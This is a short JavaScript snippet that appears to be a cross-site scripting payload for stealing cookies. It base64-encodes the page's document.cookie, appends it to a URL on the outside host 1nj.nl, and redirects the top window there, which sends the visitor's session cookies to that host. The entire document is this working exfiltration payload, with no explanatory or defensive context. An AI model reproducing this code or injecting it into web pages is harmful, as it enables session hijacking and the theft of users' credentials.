data_cookies = btoa(document.cookie);
data_url = `https://1nj.nl/?c=${encodeURIComponent(data_cookies)}`;
top.document.location = data_url
